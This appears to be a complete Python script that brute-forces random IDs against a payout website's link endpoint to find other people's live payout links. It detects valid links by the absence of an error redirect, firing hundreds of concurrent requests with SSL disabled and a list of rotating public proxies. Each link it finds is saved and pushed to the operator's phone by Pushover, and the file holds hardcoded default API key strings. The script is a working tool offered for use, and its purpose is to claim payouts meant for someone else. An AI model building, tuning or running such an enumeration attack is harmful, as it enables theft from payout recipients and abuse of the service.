#!/usr/bin/env python3
"""
Payout Link Hunter - Complete Production Script
Zero cost, maximum speed using redirect detection
"""

import asyncio
import aiohttp
import random
import string
import json
import time
from datetime import datetime
import requests
import sys
import os

# ==================== CONFIGURATION ====================
# Get your free Pushover account at https://pushover.net
# 1. Sign up for free account
# 2. Get your User Key from the dashboard
# 3. Create a new application and get the API Token

# REQUIRED: Set these environment variables or edit directly
PUSHOVER_USER_KEY = os.getenv("PUSHOVER_USER", "uthdrjggurywppdc33k5y49nkeegqe")  # Your user key
PUSHOVER_APP_TOKEN = os.getenv("PUSHOVER_TOKEN", "akwpdxg8sgshj353wz3xdgfmfjbhez")  # Your app token

# Payout site configuration
BASE_URL = "https://mesa.payoutsnetwork.com/?id="
ERROR_URL = "https://mesa.payoutsnetwork.com/error"

# Performance settings
CONCURRENT_CONNECTIONS = 200  # Simultaneous checks
BATCH_SIZE = 500  # IDs per batch
REQUEST_TIMEOUT = 3  # Seconds
MAX_RETRIES = 1

# File storage
FOUND_LINKS_FILE = "found_payouts.json"
STATS_FILE = "hunt_stats.json"

# Free proxy list (optional - comment out to disable)
FREE_PROXIES = [
    # These are public proxies - unreliable but free
    # Comment out this entire list to run without proxies
    "http://103.149.162.195:80",
    "http://47.91.88.100:1080",
    "http://47.252.1.180:3128",
    "http://144.217.101.242:3129",
    "http://192.109.165.129:80",
]

# ========================================================

class PayoutHunter:
    def __init__(self):
        self.found_links = self.load_found_links()
        self.stats = self.load_stats()
        self.session = None
        self.proxy_index = 0
        self.start_time = time.time()
        self.checks_count = 0
        self.use_proxies = bool(FREE_PROXIES)
        
        # Validate Pushover credentials
        if not PUSHOVER_USER_KEY or not PUSHOVER_APP_TOKEN:
            print("⚠️  WARNING: Pushover credentials not set!")
            print("   Set PUSHOVER_USER and PUSHOVER_TOKEN environment variables")
            print("   Or edit the script directly with your keys")
            print("   Get free account at: https://pushover.net")
            print()
            response = input("Continue without notifications? (y/n): ")
            if response.lower() != "y":
                sys.exit(1)
    
    def load_found_links(self):
        """Load previously found links"""
        try:
            with open(FOUND_LINKS_FILE, "r") as f:
                data = json.load(f)
                return set(link["url"] for link in data.get("links", []))
        except FileNotFoundError:
            return set()
    
    def load_stats(self):
        """Load hunt statistics"""
        try:
            with open(STATS_FILE, "r") as f:
                return json.load(f)
        except FileNotFoundError:
            return {
                "total_checked": 0,
                "total_found": 0,
                "last_found": None,
                "hunt_sessions": 0
            }
    
    def save_found_link(self, url):
        """Save a found link to file"""
        data = {"links": []}
        try:
            with open(FOUND_LINKS_FILE, "r") as f:
                data = json.load(f)
        except:
            pass
        
        data["links"].append({
            "url": url,
            "id": url.split("=")[-1],
            "found_at": datetime.now().isoformat(),
            "session": self.stats["hunt_sessions"]
        })
        
        with open(FOUND_LINKS_FILE, "w") as f:
            json.dump(data, f, indent=2)
    
    def save_stats(self):
        """Save hunt statistics"""
        self.stats["total_checked"] = self.checks_count
        self.stats["total_found"] = len(self.found_links)
        with open(STATS_FILE, "w") as f:
            json.dump(self.stats, f, indent=2)
    
    def get_next_proxy(self):
        """Rotate through free proxies"""
        if not self.use_proxies or not FREE_PROXIES:
            return None
        proxy = FREE_PROXIES[self.proxy_index % len(FREE_PROXIES)]
        self.proxy_index += 1
        return proxy
    
    async def check_id(self, id_str, session=None):
        """Check if ID redirects to error (invalid) or not (valid)"""
        url = BASE_URL + id_str
        
        # Skip if already found
        if url in self.found_links:
            return None
        
        # Use provided session or main session
        if not session:
            session = self.session
        
        for retry in range(MAX_RETRIES + 1):
            try:
                async with session.get(url, allow_redirects=False, ssl=False) as response:
                    # Check redirect location
                    if response.status in [301, 302, 303, 307, 308]:
                        location = response.headers.get("Location", "")
                        if ERROR_URL in location or "/error" in location:
                            return None  # Invalid ID
                    
                    # No error redirect = valid payout
                    return url
                    
            except asyncio.TimeoutError:
                if retry < MAX_RETRIES:
                    await asyncio.sleep(0.1)
                    continue
                return None
            except Exception:
                return None
        
        return None
    
    def send_notification(self, url):
        """Send push notification to iPhone"""
        if not PUSHOVER_USER_KEY or not PUSHOVER_APP_TOKEN:
            return
        
        def notify():
            try:
                response = requests.post(
                    "https://api.pushover.net/1/messages.json",
                    data={
                        "token": PUSHOVER_APP_TOKEN,
                        "user": PUSHOVER_USER_KEY,
                        "title": "💰 New Payout Found!",
                        "message": f"Found active payout link:\n{url}",
                        "url": url,
                        "url_title": "Open Payout",
                        "priority": 1,
                        "sound": "cashregister"
                    },
                    timeout=5
                )
                if response.status_code == 200:
                    print(f"   📱 Notification sent!")
            except Exception as e:
                print(f"   ⚠️  Notification failed: {e}")
        
        # Run in background
        asyncio.create_task(asyncio.to_thread(notify))
    
    async def hunt_batch(self):
        """Check a batch of random IDs"""
        # Generate random IDs
        ids = []
        for _ in range(BATCH_SIZE):
            id_str = "".join(random.choices(string.ascii_letters + string.digits, k=10))
            ids.append(id_str)
        
        # Create tasks
        tasks = [self.check_id(id_str) for id_str in ids]
        
        # Run tasks concurrently
        results = await asyncio.gather(*tasks)
        
        # Process results
        found_count = 0
        for url in results:
            if url:
                if url not in self.found_links:
                    self.found_links.add(url)
                    self.save_found_link(url)
                    self.send_notification(url)
                    self.stats["last_found"] = datetime.now().isoformat()
                    found_count += 1
                    print(f"\n🎉 FOUND: {url}")
        
        self.checks_count += len(ids)
        return found_count

    async def main(self):
        """Main hunting loop"""
        print("🔫  Starting Payout Hunter...")
        print(f"   - Concurrent checks: {CONCURRENT_CONNECTIONS}")
        print(f"   - Batch size: {BATCH_SIZE}")
        print(f"   - Proxies enabled: {self.use_proxies}")
        print("   - Press Ctrl+C to stop")
        print("\n" + "="*40)
        
        self.stats["hunt_sessions"] += 1
        
        # Create aiohttp session
        timeout = aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
        connector = aiohttp.TCPConnector(limit_per_host=CONCURRENT_CONNECTIONS, ssl=False)
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            self.session = session
            
            while True:
                try:
                    batch_start_time = time.time()
                    found_in_batch = await self.hunt_batch()
                    batch_duration = time.time() - batch_start_time
                    
                    # Print stats
                    elapsed_time = time.time() - self.start_time
                    checks_per_sec = self.checks_count / elapsed_time if elapsed_time > 0 else 0
                    
                    print(
                        f"[{datetime.now().strftime("%H:%M:%S")}] "
                        f"Checked: {self.checks_count:,.0f} | "
                        f"Found: {len(self.found_links)} | "
                        f"Rate: {checks_per_sec:,.0f}/s | "
                        f"Batch time: {batch_duration:.2f}s | "
                        f"Found this batch: {found_in_batch}"
                    )
                    
                    # Save stats periodically
                    self.save_stats()
                    
                except aiohttp.ClientConnectorError as e:
                    print(f"\n⚠️  Connection error: {e}. Check your internet or proxy.")
                    await asyncio.sleep(10)
                except Exception as e:
                    print(f"\nAn unexpected error occurred: {e}")
                    await asyncio.sleep(10)

if __name__ == "__main__":
    hunter = PayoutHunter()
    try:
        asyncio.run(hunter.main())
    except KeyboardInterrupt:
        print("\n\n🛑 Hunt stopped by user.")
        hunter.save_stats()
        print("   Final stats saved.")
    finally:
        print("👋 Goodbye!")
